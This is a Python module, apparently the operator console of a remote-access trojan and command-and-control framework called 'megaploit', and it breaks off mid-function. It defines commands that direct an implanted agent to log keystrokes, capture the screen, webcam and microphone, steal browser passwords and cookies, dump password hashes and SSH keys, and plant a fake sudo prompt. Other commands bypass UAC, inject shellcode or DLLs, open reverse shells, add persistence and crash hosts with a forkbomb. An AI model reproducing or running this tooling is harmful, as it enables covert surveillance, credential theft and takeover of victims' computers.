"""
megaploit.server.commands
~~~~~~~~~~~~~~~~~~~~~~~~~
Every command that the operator can run against an active session.

Only C2-specific commands live here — things a plain shell cannot do.
Generic shell work goes through the shell fallback (any unrecognised
token is forwarded as a raw shell command to the agent).
"""

from __future__ import annotations

import logging
import os
import socket
from dataclasses import dataclass
from datetime import datetime, timezone

from megaploit.core.protocol import send_msg, recv_msg, send_file, recv_file
from megaploit.server.session import Session
from megaploit.core.config import MAX_RECORD_SECONDS, AUDIT_LOG
from megaploit.toolbox import runner as _runner


# ---------------------------------------------------------------------------
# Audit logger
# ---------------------------------------------------------------------------

def _setup_cmd_logger() -> logging.Logger:
    os.makedirs(os.path.dirname(AUDIT_LOG) or ".", exist_ok=True)
    logger = logging.getLogger("megaploit.commands")
    if not logger.handlers:
        handler = logging.FileHandler(AUDIT_LOG, encoding="utf-8")
        handler.setFormatter(logging.Formatter(
            "%(asctime)s UTC  %(message)s", datefmt="%Y-%m-%d %H:%M:%S"
        ))
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)
    return logger

_cmd_log = _setup_cmd_logger()


def _audit(session: Session, cmd: str, result_ok: bool) -> None:
    status = "OK" if result_ok else "FAIL"
    _cmd_log.info("CMD  session=%d  ip=%-18s  status=%s  cmd=%s",
                  session.id, session.ip, status, cmd[:200])


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass
class CommandResult:
    ok: bool
    output: str = ""
    close_session: bool = False


# ---------------------------------------------------------------------------
# Command registry
# ---------------------------------------------------------------------------

_registry: dict[str, "_CommandDef"] = {}


@dataclass
class _CommandDef:
    name: str
    usage: str
    help_text: str
    dangerous: bool
    handler: object


def _cmd(name: str, usage: str = "", help_text: str = "", dangerous: bool = False):
    def decorator(fn):
        _registry[name] = _CommandDef(name=name, usage=usage,
                                       help_text=help_text, dangerous=dangerous, handler=fn)
        return fn
    return decorator


def _ok(msg: str = "") -> CommandResult:
    return CommandResult(ok=True, output=msg)

def _err(msg: str) -> CommandResult:
    return CommandResult(ok=False, output=msg)


def _recv_file_or_err(conn, local: str, timeout: float | None = None) -> "CommandResult | None":
    """
    Read the agent's FILE_OK / error handshake then pull the file.
    Returns a CommandResult on error, or None on success (caller should
    then return their own _ok()).
    """
    status = recv_msg(conn)
    if status != "FILE_OK":
        return _err(str(status))
    try:
        recv_file(conn, local, timeout=timeout)
        return None
    except (socket.timeout, ConnectionError) as e:
        return _err(f"[-] File receive failed: {e}")


# ---------------------------------------------------------------------------
# Core
# ---------------------------------------------------------------------------

@_cmd("help", usage="help", help_text="Show this help message")
def cmd_help(session: Session, args: list[str]) -> CommandResult:
    lines = ["", f"  {'COMMAND':<36}  DESCRIPTION"]
    lines.append(f"  {'─' * 36}  {'─' * 44}")
    for name, defn in sorted(_registry.items()):
        tag = "  [!]" if defn.dangerous else ""
        lines.append(f"  {defn.usage or name:<36}  {defn.help_text}{tag}")
    lines.append("")
    lines.append("  [!] = Dangerous — requires explicit confirmation")
    lines.append("  Any unrecognised command is forwarded as a raw shell command.")
    lines.append("")
    return _ok("\n".join(lines))


@_cmd("exit", usage="exit", help_text="Terminate the agent session")
def cmd_exit(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "exit")
    return CommandResult(ok=True, output="[*] Session closed.", close_session=True)


@_cmd("sysinfo", usage="sysinfo",
      help_text="OS, hostname, user, arch, Python, CPU%, RAM, disk")
def cmd_sysinfo(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "sysinfo")
    return _ok(recv_msg(session.conn))


@_cmd("cd", usage="cd <directory>", help_text="Change working directory on the target")
def cmd_cd(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: cd <directory>")
    send_msg(session.conn, f"cd {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("shell", usage="shell <command>",
      help_text="Execute a raw shell command (also: just type the command directly)")
def cmd_shell(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: shell <command>")
    send_msg(session.conn, " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# File transfer — uses the binary length-prefix protocol, not shell
# ---------------------------------------------------------------------------

@_cmd("upload", usage="upload <local_file>",
      help_text="Push a local file to the target over the C2 channel")
def cmd_upload(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: upload <local_file>")
    path = args[0]
    if not os.path.isfile(path):
        return _err(f"File not found: {path}")
    send_msg(session.conn, f"upload {os.path.basename(path)}")
    send_file(session.conn, path)
    try:
        ack = recv_msg(session.conn)
    except Exception:
        ack = ""
    return _ok(f"[+] Uploaded '{path}'" + (f"\n    Agent: {ack}" if ack else ""))


@_cmd("download", usage="download <remote_file>",
      help_text="Pull a file from the target over the C2 channel")
def cmd_download(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1:
        return _err("Usage: download <remote_file>")
    remote = args[0]
    local  = session.download_path(remote)
    send_msg(session.conn, f"download {remote}")
    err = _recv_file_or_err(session.conn, local, timeout=60)
    if err:
        return err
    return _ok(f"[+] Saved to: {local}")


@_cmd("zip_download", usage="zip_download <remote_path>",
      help_text="Zip a directory on the target and pull the archive in one transfer")
def cmd_zip_download(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: zip_download <remote_path>")
    send_msg(session.conn, f"zip_download {args[0]}")
    local = session.download_path(args[0].rstrip("/\\") + ".zip")
    err = _recv_file_or_err(session.conn, local, timeout=120)
    if err:
        return err
    return _ok(f"[+] Archive saved: {local}")


# ---------------------------------------------------------------------------
# Screen / audio capture
# ---------------------------------------------------------------------------

@_cmd("screenshot", usage="screenshot",
      help_text="Capture a full screenshot from the target (saved with PNG metadata)")
def cmd_screenshot(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "screenshot")
    local = session.screenshot_path()
    err = _recv_file_or_err(session.conn, local, timeout=20)
    if err:
        return err
    _embed_screenshot_metadata(local, session)
    return _ok(f"[+] Screenshot saved: {local}")


def _embed_screenshot_metadata(path: str, session: "Session") -> None:
    try:
        from PIL import Image, PngImagePlugin
        img  = Image.open(path)
        meta = PngImagePlugin.PngInfo()
        meta.add_text("Source",     session.ip)
        meta.add_text("CapturedAt", datetime.now(timezone.utc).isoformat())
        meta.add_text("SessionId",  str(session.id))
        img.save(path, pnginfo=meta)
    except Exception:
        pass


@_cmd("screenshot_timelapse", usage="screenshot_timelapse <count> <interval_sec>",
      help_text="Take N silent screenshots every N seconds, zip and pull back")
def cmd_screenshot_timelapse(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2 or not args[0].isdigit() or not args[1].isdigit():
        return _err("Usage: screenshot_timelapse <count> <interval_sec>")
    send_msg(session.conn, f"screenshot_timelapse {args[0]} {args[1]}")
    wait = int(args[0]) * int(args[1]) + 10
    local = session.download_path("timelapse.zip")
    err = _recv_file_or_err(session.conn, local, timeout=wait)
    if err:
        return err
    return _ok(f"[+] Timelapse saved: {local}  ({args[0]} frames, {args[1]}s apart)")


@_cmd("record", usage="record <seconds>",
      help_text="Record microphone audio from the target (max 300s)")
def cmd_record(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or not args[0].isdigit():
        return _err("Usage: record <seconds>")
    seconds = int(args[0])
    if seconds > MAX_RECORD_SECONDS:
        return _err(f"[-] Max {MAX_RECORD_SECONDS}s")
    local = session.recording_path()
    send_msg(session.conn, f"record {seconds}")
    err = _recv_file_or_err(session.conn, local, timeout=seconds + 20)
    if err:
        return err
    return _ok(f"[+] Recording saved: {local}")


@_cmd("mic_level", usage="mic_level",
      help_text="Snapshot the microphone dB level — detect if someone is speaking")
def cmd_mic_level(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "mic_level")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Streaming
# ---------------------------------------------------------------------------

@_cmd("screen_stream", usage="screen_stream <on|off>",
      help_text="Start/stop live desktop MJPEG stream at http://<target>:5000")
def cmd_screen_stream(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return _err("Usage: screen_stream <on|off>")
    send_msg(session.conn, f"screen_stream {args[0]}")
    resp  = recv_msg(session.conn)
    label = "started" if args[0] == "on" else "stopped"
    return _ok(f"[+] Screen stream {label} — {resp}")


@_cmd("webcam", usage="webcam <on|off>",
      help_text="Start/stop live webcam MJPEG stream at http://<target>:5001")
def cmd_webcam(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 1 or args[0] not in ("on", "off"):
        return _err("Usage: webcam <on|off>")
    send_msg(session.conn, f"webcam {args[0]}")
    resp  = recv_msg(session.conn)
    label = "started" if args[0] == "on" else "stopped"
    return _ok(f"[+] Webcam {label} — {resp}")


# ---------------------------------------------------------------------------
# Persistence / keylogger
# ---------------------------------------------------------------------------

@_cmd("persist", usage="persist <regname> <filename>",
      help_text="Copy agent to AppData and add a Windows Run registry key")
def cmd_persist(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: persist <regname> <filename>")
    send_msg(session.conn, f"persist {args[0]} {args[1]}")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_start", usage="keylog_start",
      help_text="Start silent keystroke capture on the target")
def cmd_keylog_start(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_start")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_dump", usage="keylog_dump",
      help_text="Download captured keystrokes from the target")
def cmd_keylog_dump(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_dump")
    return _ok(recv_msg(session.conn))


@_cmd("keylog_stop", usage="keylog_stop",
      help_text="Stop keylogger and delete its log file on the target")
def cmd_keylog_stop(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "keylog_stop")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Clipboard
# ---------------------------------------------------------------------------

@_cmd("getclip", usage="getclip",
      help_text="Read the current clipboard contents from the target")
def cmd_getclip(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "getclip")
    return _ok(recv_msg(session.conn))


@_cmd("setclip", usage="setclip <text>",
      help_text="Silently overwrite the target's clipboard with arbitrary text")
def cmd_setclip(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: setclip <text>")
    send_msg(session.conn, "setclip " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Credential harvesting
# ---------------------------------------------------------------------------

@_cmd("hashdump", usage="hashdump",
      help_text="Dump /etc/shadow (Linux) or save SAM+SYSTEM (Windows). Needs root/SYSTEM",
      dangerous=True)
def cmd_hashdump(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "hashdump")
    return _ok(recv_msg(session.conn))


@_cmd("wifi_passwords", usage="wifi_passwords",
      help_text="Extract all saved Wi-Fi SSIDs and passwords (cross-platform)")
def cmd_wifi_passwords(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "wifi_passwords")
    return _ok(recv_msg(session.conn))


@_cmd("browser_history", usage="browser_history [count]",
      help_text="Read Chrome/Firefox/Edge history from SQLite DBs without opening the browser")
def cmd_browser_history(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("browser_history " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("browser_creds", usage="browser_creds [cookies|passwords|all]",
      help_text="Steal all browser cookies + saved passwords from Chrome/Edge/Brave/Opera/Firefox")
def cmd_browser_creds(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("browser_creds " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("search", usage="search <path> <keyword>",
      help_text="Recursively grep file contents on the target (find passwords, keys, secrets)")
def cmd_search(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: search <path> <keyword>")
    send_msg(session.conn, "search " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Network pivoting
# ---------------------------------------------------------------------------

@_cmd("portfwd", usage="portfwd <lport> <rhost> <rport>",
      help_text="Bind a port on the target and relay TCP traffic to an internal host")
def cmd_portfwd(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 3:
        return _err("Usage: portfwd <local_port> <remote_host> <remote_port>")
    send_msg(session.conn, "portfwd " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# User-activity awareness
# ---------------------------------------------------------------------------

@_cmd("idle_time", usage="idle_time",
      help_text="Seconds since last keyboard/mouse input — is someone at the keyboard?")
def cmd_idle_time(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "idle_time")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# GUI interaction
# ---------------------------------------------------------------------------

@_cmd("msgbox", usage="msgbox <title> <message>",
      help_text="Pop a visible dialog box on the target's desktop (distraction / social engineering)")
def cmd_msgbox(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: msgbox <title> <message>")
    send_msg(session.conn, "msgbox " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Code injection (Windows)
# ---------------------------------------------------------------------------

@_cmd("inject_shellcode", usage="inject_shellcode <pid> <hex>",
      help_text="Inject hex-encoded shellcode into a running Windows process via remote thread",
      dangerous=True)
def cmd_inject_shellcode(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2 or not args[0].isdigit():
        return _err("Usage: inject_shellcode <pid> <hex_shellcode>")
    send_msg(session.conn, "inject_shellcode " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Self-destruct
# ---------------------------------------------------------------------------

@_cmd("self_destruct", usage="self_destruct",
      help_text="Wipe agent binary + persistence + keylog, then kill the agent process",
      dangerous=True)
def cmd_self_destruct(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "self_destruct")
    try:
        resp = recv_msg(session.conn)
    except Exception:
        resp = "[*] Agent process terminated."
    return CommandResult(ok=True, output=resp, close_session=True)


# ---------------------------------------------------------------------------
# Evasion
# ---------------------------------------------------------------------------

@_cmd("lock_screen", usage="lock_screen",
      help_text="Lock the target's workstation silently (cover tracks while operating)")
def cmd_lock_screen(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "lock_screen")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Privilege escalation
# ---------------------------------------------------------------------------

@_cmd("token_steal", usage="token_steal [pid]",
      help_text="Steal a SYSTEM process token and impersonate it (Windows, needs admin)",
      dangerous=True)
def cmd_token_steal(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("token_steal " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("uac_bypass", usage="uac_bypass <command>",
      help_text="Bypass UAC on Windows 10/11 via fodhelper registry hijack (no prompts)",
      dangerous=True)
def cmd_uac_bypass(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: uac_bypass <command>")
    send_msg(session.conn, "uac_bypass " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Credential harvesting (advanced)
# ---------------------------------------------------------------------------

@_cmd("cred_vault", usage="cred_vault",
      help_text="Dump Windows Credential Manager (RDP passwords, generic secrets) via ctypes")
def cmd_cred_vault(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "cred_vault")
    return _ok(recv_msg(session.conn))


@_cmd("ssh_harvest", usage="ssh_harvest",
      help_text="Dump all SSH private keys, known_hosts and shell history SSH commands")
def cmd_ssh_harvest(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "ssh_harvest")
    return _ok(recv_msg(session.conn))


@_cmd("sudo_sniff", usage="sudo_sniff [log_path]",
      help_text="Plant a fake sudo wrapper that captures the next password typed (Unix)")
def cmd_sudo_sniff(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("sudo_sniff " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Code execution
# ---------------------------------------------------------------------------

@_cmd("living_off_land", usage="living_off_land <lolbin> <args>",
      help_text="Execute via signed Windows LOLBins (mshta/certutil/rundll32/wmic/…)",
      dangerous=True)
def cmd_living_off_land(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: living_off_land <lolbin> <args>")
    send_msg(session.conn, "living_off_land " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("dll_inject", usage="dll_inject <pid> <dll_path>",
      help_text="Inject a DLL into a Windows process via LoadLibraryA remote thread",
      dangerous=True)
def cmd_dll_inject(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: dll_inject <pid> <dll_path>")
    send_msg(session.conn, "dll_inject " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("reverse_shell", usage="reverse_shell <ip> <port>",
      help_text="Open an interactive PTY reverse shell back to operator (separate from C2)",
      dangerous=True)
def cmd_reverse_shell(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 2:
        return _err("Usage: reverse_shell <ip> <port>")
    send_msg(session.conn, "reverse_shell " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Pivoting
# ---------------------------------------------------------------------------

@_cmd("socks5", usage="socks5 [port]",
      help_text="Start a SOCKS5 proxy on the target (default 1080) — pivot through the target")
def cmd_socks5(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("socks5 " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Screen recording
# ---------------------------------------------------------------------------

@_cmd("screenrecord", usage="screenrecord <seconds> [fps] [scale_width]",
      help_text="Record the target's desktop as MP4 (default 12 fps, 1280px wide) and pull it back")
def cmd_screenrecord(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: screenrecord <seconds> [fps] [scale_width]")
    seconds = int(args[0])
    local   = session.download_path("screenrec.mp4")
    send_msg(session.conn, f"screenrecord {' '.join(args)}")
    err = _recv_file_or_err(session.conn, local, timeout=seconds + 30)
    if err:
        return err
    return _ok(f"[+] Screen recording saved: {local}")


# ---------------------------------------------------------------------------
# GUI control
# ---------------------------------------------------------------------------

@_cmd("mouse_move", usage="mouse_move <x> <y> [click]",
      help_text="Move the mouse to (x,y) on the target; optionally click")
def cmd_mouse_move(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: mouse_move <x> <y> [click]")
    send_msg(session.conn, "mouse_move " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("type_keys", usage="type_keys text|hotkey <args>",
      help_text="Silently type text or fire a hotkey on the target (e.g. type_keys hotkey win r)")
def cmd_type_keys(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: type_keys text <string>  OR  type_keys hotkey <key> [key2…]")
    send_msg(session.conn, "type_keys " + " ".join(args))
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Destructive
# ---------------------------------------------------------------------------

@_cmd("forkbomb", usage="forkbomb",
      help_text="Crash the target with an infinite process fork (Unix only)",
      dangerous=True)
def cmd_forkbomb(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "forkbomb")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# C-exclusive command auto-registration
# ---------------------------------------------------------------------------
# c_probe.c_exclusive_verbs() scans the C source for strncmp() dispatch verbs
# that have no Python-agent counterpart and registers an operator command for
# each one automatically.  No verb names or wire strings are hardcoded here —
# adding a new strncmp("myVerb()", …) in shell.c is all that's needed.
# ---------------------------------------------------------------------------

def _register_c_exclusive_cmds() -> None:
    """
    Read C-exclusive verbs from the source tree and register a command for
    each one.  Called once at module import time.

    Each generated command:
      - Sends the exact wire string the C client dispatches on
      - Is marked dangerous=True (all C-exclusive verbs are destructive)
      - Does NOT expect a response (C client acts immediately and may crash)
    """
    try:
        from megaploit.core.c_probe import c_exclusive_verbs as _cev
        here   = os.path.dirname(os.path.abspath(__file__))
        c_root = os.path.normpath(os.path.join(here, "..", "..", "C-remote-shell"))
        verbs  = _cev(c_root)
    except Exception:
        return

    for wire_verb in verbs:
        # Derive a clean operator-facing name: lowercase, strip "()" and spaces
        cmd_name = wire_verb.rstrip("() ").lower()

        # Avoid re-registering if something already claimed this name
        if cmd_name in _registry:
            continue

        # Capture wire_verb in the closure by default-argument binding
        def _make_handler(verb: str) -> object:
            def _handler(session: Session, args: list[str]) -> CommandResult:
                send_msg(session.conn, verb)
                return CommandResult(
                    ok=True,
                    output=f"[*] {verb} sent to C-agent.",
                    close_session=True,
                )
            _handler.__name__ = f"cmd_{verb.rstrip('() ').lower()}"
            return _handler

        _registry[cmd_name] = _CommandDef(
            name=cmd_name,
            usage=cmd_name,
            help_text=f"[C-agent] Send '{wire_verb}' verb (auto-detected from C source)",
            dangerous=True,
            handler=_make_handler(wire_verb),
        )


_register_c_exclusive_cmds()


# ---------------------------------------------------------------------------
# Process & network intelligence
# ---------------------------------------------------------------------------

@_cmd("ps", usage="ps [filter]",
      help_text="List running processes on the target; optional name/pid filter")
def cmd_ps(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("ps " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("kill", usage="kill <pid>",
      help_text="Terminate a process on the target by PID")
def cmd_kill(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: kill <pid>")
    send_msg(session.conn, f"kill {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("netstat", usage="netstat",
      help_text="Show active TCP/UDP connections and listening ports on the target")
def cmd_netstat(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "netstat")
    return _ok(recv_msg(session.conn))


@_cmd("arp", usage="arp",
      help_text="Dump the ARP cache on the target — discover other hosts on the LAN")
def cmd_arp(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "arp")
    return _ok(recv_msg(session.conn))


@_cmd("dns_query", usage="dns_query <hostname>",
      help_text="Resolve a hostname from the target's perspective")
def cmd_dns_query(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: dns_query <hostname>")
    send_msg(session.conn, f"dns_query {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("routes", usage="routes",
      help_text="Print the IP routing table on the target")
def cmd_routes(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "routes")
    return _ok(recv_msg(session.conn))


@_cmd("ifconfig", usage="ifconfig",
      help_text="Show all network interfaces and their IP/MAC addresses")
def cmd_ifconfig(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "ifconfig")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Environment & system discovery
# ---------------------------------------------------------------------------

@_cmd("env", usage="env [filter]",
      help_text="Dump all environment variables from the target process; optional key filter")
def cmd_env(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("env " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("installed_software", usage="installed_software",
      help_text="List installed programs (Windows: registry; Linux: dpkg/rpm/pacman)")
def cmd_installed_software(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "installed_software")
    return _ok(recv_msg(session.conn))


@_cmd("active_windows", usage="active_windows",
      help_text="List all visible window titles on the target desktop")
def cmd_active_windows(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "active_windows")
    return _ok(recv_msg(session.conn))


@_cmd("scheduled_tasks", usage="scheduled_tasks",
      help_text="Enumerate scheduled tasks / cron jobs on the target")
def cmd_scheduled_tasks(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "scheduled_tasks")
    return _ok(recv_msg(session.conn))


@_cmd("services", usage="services [filter]",
      help_text="List running/stopped services on the target (Windows SCM / systemctl)")
def cmd_services(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("services " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("users", usage="users",
      help_text="List local user accounts and groups on the target")
def cmd_users(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "users")
    return _ok(recv_msg(session.conn))


@_cmd("logged_in", usage="logged_in",
      help_text="Show currently logged-in users (who/query user/w)")
def cmd_logged_in(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "logged_in")
    return _ok(recv_msg(session.conn))


@_cmd("startup_items", usage="startup_items",
      help_text="List all autostart entries (registry Run keys, startup folder, LaunchDaemons)")
def cmd_startup_items(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "startup_items")
    return _ok(recv_msg(session.conn))


@_cmd("os_info", usage="os_info",
      help_text="Extended OS fingerprint: build, patch level, install date, uptime")
def cmd_os_info(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "os_info")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# File intelligence
# ---------------------------------------------------------------------------

@_cmd("ls", usage="ls [path]",
      help_text="List directory contents on the target with size/perms/date")
def cmd_ls(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, ("ls " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("cat", usage="cat <remote_file>",
      help_text="Print the contents of a small text file on the target")
def cmd_cat(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: cat <remote_file>")
    send_msg(session.conn, f"cat {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("find_files", usage="find_files <path> <pattern>",
      help_text="Recursively find files matching a glob pattern on the target")
def cmd_find_files(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: find_files <path> <pattern>")
    send_msg(session.conn, f"find_files {args[0]} {args[1]}")
    return _ok(recv_msg(session.conn))


@_cmd("find_writable", usage="find_writable <path>",
      help_text="Find world-writable files and directories under <path>")
def cmd_find_writable(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: find_writable <path>")
    send_msg(session.conn, f"find_writable {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("find_suid", usage="find_suid",
      help_text="Find SUID/SGID binaries on the target — common privesc vectors")
def cmd_find_suid(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "find_suid")
    return _ok(recv_msg(session.conn))


@_cmd("file_hash", usage="file_hash <remote_path>",
      help_text="Compute SHA-256 hash of a file on the target")
def cmd_file_hash(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: file_hash <remote_path>")
    send_msg(session.conn, f"file_hash {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("tail", usage="tail <remote_file> [lines]",
      help_text="Print the last N lines of a file on the target (default 20)")
def cmd_tail(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: tail <remote_file> [lines]")
    send_msg(session.conn, ("tail " + " ".join(args)).strip())
    return _ok(recv_msg(session.conn))


@_cmd("write_file", usage="write_file <remote_path> <content>",
      help_text="Write arbitrary text content into a file on the target")
def cmd_write_file(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: write_file <remote_path> <content>")
    send_msg(session.conn, "write_file " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("mkdir", usage="mkdir <remote_path>",
      help_text="Create a directory on the target")
def cmd_mkdir(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: mkdir <remote_path>")
    send_msg(session.conn, f"mkdir {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("rm", usage="rm <remote_path>",
      help_text="Delete a file or directory on the target",
      dangerous=True)
def cmd_rm(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: rm <remote_path>")
    send_msg(session.conn, f"rm {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("chmod", usage="chmod <mode> <remote_path>",
      help_text="Change file permissions on the target (Unix only)")
def cmd_chmod(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: chmod <mode> <remote_path>")
    send_msg(session.conn, f"chmod {args[0]} {args[1]}")
    return _ok(recv_msg(session.conn))


@_cmd("zip_upload", usage="zip_upload <local_dir> <remote_name>",
      help_text="Zip a local directory and upload the archive to the target in one transfer")
def cmd_zip_upload(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: zip_upload <local_dir> <remote_name>")
    local_dir = args[0]
    remote_name = args[1]
    if not os.path.isdir(local_dir):
        return _err(f"Local directory not found: {local_dir}")
    import tempfile, zipfile as _zipfile
    with tempfile.NamedTemporaryFile(suffix=".zip", delete=False) as tmp:
        tmp_path = tmp.name
    try:
        with _zipfile.ZipFile(tmp_path, "w", _zipfile.ZIP_DEFLATED) as zf:
            for root, dirs, files in os.walk(local_dir):
                for fname in files:
                    full = os.path.join(root, fname)
                    arc  = os.path.relpath(full, local_dir)
                    zf.write(full, arc)
        send_msg(session.conn, f"upload {remote_name}")
        send_file(session.conn, tmp_path)
        try:
            ack = recv_msg(session.conn)
        except Exception:
            ack = ""
        return _ok(f"[+] Uploaded '{local_dir}' as '{remote_name}'"
                   + (f"\n    Agent: {ack}" if ack else ""))
    finally:
        try:
            os.unlink(tmp_path)
        except OSError:
            pass


# ---------------------------------------------------------------------------
# Advanced clipboard
# ---------------------------------------------------------------------------

@_cmd("clip_watch", usage="clip_watch <seconds>",
      help_text="Poll clipboard every 2s for <seconds> — capture anything pasted")
def cmd_clip_watch(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: clip_watch <seconds>")
    seconds = int(args[0])
    send_msg(session.conn, f"clip_watch {seconds}")
    old_timeout = session.conn.gettimeout()
    session.conn.settimeout(seconds + 10)
    try:
        return _ok(recv_msg(session.conn))
    except Exception as e:
